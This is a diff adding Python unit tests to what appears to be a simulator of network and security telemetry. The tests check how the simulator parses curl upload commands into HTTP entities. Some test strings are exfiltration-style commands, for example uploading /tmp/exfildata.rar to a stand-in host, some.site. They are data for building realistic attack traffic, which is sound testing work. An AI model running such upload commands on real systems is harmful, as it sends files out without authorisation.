@@ -1315,6 +1315,23 @@ class TestFileTransferActionBundles:
         assert result.file_transfer.duration < request.parent_duration
         assert result.file_transfer.seen_bytes == request.response_body_len
 
+    def test_tiny_generic_http_response_does_not_invent_pe_analysis(self):
+        """Ambiguous small bodies keep file evidence without speculative PE metadata."""
+
+        request = HttpResponseFileTransferRequest(
+            host="api.example.test",
+            uri="/result",
+            dst_ip="93.184.216.34",
+            response_body_len=4096,
+            response_mime_types=["application/octet-stream"],
+            timestamp=datetime(2026, 5, 18, 12, 0, tzinfo=UTC),
+        )
+
+        result = HttpResponseFileTransferActionBundle(request, random.Random(4)).execute()
+
+        assert result.file_transfer.total_bytes == 4096
+        assert result.pe is None
+
     def test_http_file_transfer_hashes_follow_static_object_identity(self):
         """Identical HTTP response objects should not get new hashes per FUID."""
         request = HttpResponseFileTransferRequest(
@@ -3380,3 +3397,61 @@ class TestStorylineCommandSideEffects:
             engine._dhcp_lease_state["ROGUE-LAPTOP"]["next_renewal"]
             == lease["time"].timestamp() + lease["renewal_interval"]
         )
+
+    def test_raw_curl_rar_upload_keeps_local_name_off_wire(self):
+        """Raw --data-binary resolves the local RAR without inventing an HTTP filename."""
+
+        entity = StorylineMixin._http_request_entity_from_command(
+            "curl --data-binary @/tmp/exfildata.rar http://some.site/uploads/accept-upload",
+            42 * 1024 * 1024,
+        )
+
+        assert entity is not None
+        assert entity.size == 44_040_192
+        assert entity.mime_type == "application/vnd.rar"
+        assert entity.local_source_path == "/tmp/exfildata.rar"
+        assert entity.local_source_filename == "exfildata.rar"
+        assert entity.wire_filename == ""
+
+    def test_multipart_curl_upload_exposes_wire_filename(self):
+        """Multipart form-data carries the basename in Content-Disposition."""
+
+        entity = StorylineMixin._http_request_multipart_from_command(
+            "curl -F file=@/tmp/report.zip http://some.site/upload",
+            8192,
+        )
+
+        assert entity is not None
+        part = entity.leaf_parts()[0]
+        assert part.local_source_filename == "report.zip"
+        assert part.wire_filename == "report.zip"
+
+    def test_literal_or_stdin_curl_body_does_not_invent_local_file(self):
+        """Inline data and stdin are request entities but are not endpoint file reads."""
+
+        assert (
+            StorylineMixin._http_request_entity_from_command(
+                'curl --data-binary \'{"status":"ok"}\' http://some.site/api/checkin',
+                15,
+            )
+            is None
+        )
+        assert (
+            StorylineMixin._http_request_entity_from_command(
+                "curl --upload-file - http://some.site/upload",
+                8192,
+            )
+            is None
+        )
+
+    def test_curl_upload_file_equals_form_resolves_local_path(self):
+        """The long curl upload option supports its equals-sign spelling."""
+
+        entity = StorylineMixin._http_request_entity_from_command(
+            "curl --upload-file=/tmp/report.rar http://some.site/upload",
+            8192,
+        )
+
+        assert entity is not None
+        assert entity.local_source_path == "/tmp/report.rar"
+        assert entity.wire_filename == ""
